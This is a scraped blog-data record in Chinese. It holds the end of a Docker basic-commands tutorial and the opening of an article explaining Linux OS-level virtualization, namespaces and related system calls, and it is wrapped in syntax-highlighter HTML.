style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e8e606919295-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e8e606919295-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e8e606919295-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">run</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">it </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e8e606919295-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这里，使用 <code>-it</code> 会打开一个 shell 与容器交互。容器启动并运行后，我们就可以像普通机器那样来使用它了，我们可以在容器中执行任何命令。</p>\n<h3 id=\"toc_6\">显示所有的 docker 容器</h3>\n<p>要列出所有 docker 容器，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e91111983516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker ps\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e91111983516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e91111983516-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e91111983516-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">ps</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e91111983516-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>会输出一个容器列表，每个容器都有一个容器 id 标识。</p>\n<h3 id=\"toc_7\">停止 docker 容器</h3>\n<p>要停止 docker 容器，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e95695724951\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker stop container-id\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e95695724951-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e95695724951-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e95695724951-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">stop </span><span class=\"crayon-v\">container</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e95695724951-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">从容器中退出</h3>\n<p>要从容器中退出，执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e98521360223\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ exit\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e98521360223-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e98521360223-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e98521360223-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e98521360223-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3 id=\"toc_9\">保存容器状态</h3>\n<p>容器运行并更改后（比如安装了 apache 服务器），我们可以保存容器状态。这会在本地系统上保存新创建镜像。</p>\n<p>运行下面语句来提交并保存容器状态：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e9b407670404\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker commit 85475ef774 repository/image_name\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e9b407670404-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e9b407670404-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e9b407670404-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">85475ef774</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">repository</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">image</span><span class=\"crayon-sy\">_</span>name</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e9b407670404-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>这里，<code>commit</code> 命令会保存容器状态，<code>85475ef774</code>，是容器的容器 id，<code>repository</code>，通常为 docker hub 上的用户名 （或者新加的仓库名称）<code>image_name</code>，是新镜像的名称。</p>\n<p>我们还可以使用 <code>-m</code> 和 <code>-a</code> 来添加更多信息。通过 <code>-m</code>，我们可以留个信息说 apache 服务器已经安装好了，而 <code>-a</code> 可以添加作者名称。</p>\n<p>像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e9f553001512\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n docker commit -m \"apache server installed\"-a \"Dan Daniels\" 85475ef774 daniels_dan/Cent_container\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e9f553001512-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e9f553001512-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e9f553001512-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"apache server installed\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Dan Daniels\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">85475ef774</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">daniels_dan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Cent</span><span class=\"crayon-sy\">_</span>container</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e9f553001512-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>我们的教程至此就结束了，本教程讲解了一下 Docker 中的那些重要的命令，如有疑问，欢迎留言。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113490\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113490votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113490\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/67490ccebef720732b63d9ddb9e17fb0a590e30a.jpg"}
{"url_object_id": "f9947ec196965902f6858b2ff93b9565", "title": "操作系统级虚拟化概述", "url": "http://blog.jobbole.com/113459/", "create_date": "2018/01/09", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,虚拟化", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/kelvinxupt/blog/1602990\">宅蓝三木</a>   </div><h1>操作系统级虚拟化</h1>\n<div>\n<p>KVM、XEN等虚拟化技术允许各个虚拟机拥有自己独立的操作系统。与KVM、XEN等虚拟化技术不同，所谓操作系统级虚拟化，也被称作容器化，是操作系统自身的一个特性，它允许多个相互隔离的用户空间实例的存在。这些用户空间实例也被称作为容器。普通的进程可以看到计算机的所有资源而容器中的进程只能看到分配给该容器的资源。通俗来讲，操作系统级虚拟化将操作系统所管理的计算机资源，包括进程、文件、设备、网络等分组，然后交给不同的容器使用。容器中运行的进程只能看到分配给该容器的资源。从而达到隔离与虚拟化的目的。</p>\n<p>实现操作系统虚拟化需要用到Namespace及cgroups技术。</p>\n<h1>命名空间(Namespace)</h1>\n<p>在编程语言中，引入命名空间的概念是为了重用变量名或者服务例程名。在不同的命名空间中使用同一个变量名而不会产生冲突。Linux系统引入命名空间也有类似的作用。例如，在没有操作系统级虚拟化的Linux系统中，用户态进程从1开始编号(PID)。引入操作系统虚拟化之后，不同容器有着不同的PID命名空间，每个容器中的进程都可以从1开始编号而不产生冲突。</p>\n<p>目前，Linux中的命名空间有6种类型，分别对应操作系统管理的6种资源：</p>\n<ul>\n<li>挂载点(mount point) CLONE_NEWNS</li>\n<li>进程(pid) CLONE_NEWPID</li>\n<li>网络(net) CLONE_NEWNET</li>\n<li>进程间通信(ipc) CLONE_NEWIPC</li>\n<li>主机名(uts) CLONE_NEWUTS</li>\n<li>用户(uid) CLONW_NEWUSER</li>\n</ul>\n<p>将来还会引入时间、设备等对应的namespace.</p>\n<p>Linux 2.4.19版本引入了第一个命名空间——挂载点，因为那时还没有其他类型的命名空间，所以clone系统调用中引入的flag就叫做CLONE_NEWNS</p>\n<h2>与命名空间相关的三个系统调用(system calls)</h2>\n<p>下面3个系统调用用来操作命名空间：</p>\n<ul>\n<li>clone() —— 用来创建新的进程及新的命名空间，新的进程会被放到新的命名空间中</li>\n<li>unshare() —— 创建新的命名空间但并不创建新的子进程，之后创建的子进程会被放到新创建的命名空间中去</li>\n<li>setns() —— 将进程加入到已经存在的命名空间中</li>\n</ul>\n<p>注意：这３个系统调用都不会改变调用进程(calling process)的pid命名空间，而是会影响其子进程的pid命名空间</p>\n<p>命名空间本身并没用名字(囧)，不同的命名空间用不同的inode号来标识，这也符合Linux用文件一统天下的惯例。可以在proc文件系统中查看一个进程所属的命名空间，例如，查看PID为4123的进程所属的命名空间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744d2688671748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkelvin@desktop:~$ ls -l /proc/4123/ns/\r\n总用量 0\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 cgroup -&gt; cgroup:[4026531835]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 ipc -&gt; ipc:[4026531839]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 mnt -&gt; mnt:[4026531840]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 net -&gt; net:[4026531963]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 pid -&gt; pid:[4026531836]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 user -&gt; user:[4026531837]\r\nlrwxrwxrwx 1 kelvin kelvin 0 12月 26 16:28 uts -&gt; uts:[4026531838]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744d2688671748-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744d2688671748-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744d2688671748-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744d2688671748-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744d2688671748-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744d2688671748-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744d2688671748-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744d2688671748-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744d2688671748-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744d2688671748-1\"><span class=\"crayon-v\">kelvin</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">desktop</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4123</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ns</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744d2688671748-2\">总用量<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744d2688671748-3\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531835</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744d2688671748-4\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipc</span><span class=\"crayon-o\">:</span><span 